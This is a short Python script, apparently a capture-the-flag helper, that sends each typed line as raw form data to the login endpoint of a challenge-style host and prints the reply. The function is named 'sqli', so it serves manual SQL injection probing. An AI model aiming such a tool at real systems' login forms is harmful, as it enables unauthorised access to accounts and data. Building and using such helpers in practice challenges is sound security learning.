import readline
import requests as rq

url = 'https://sao.h4ck3r.quest'

def sqli(data):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  res = rq.post(f'{url}/login', headers=headers, data=data)
  print(res.text)
  return res.content

while True:
  data = input('> ')
  sqli(data)
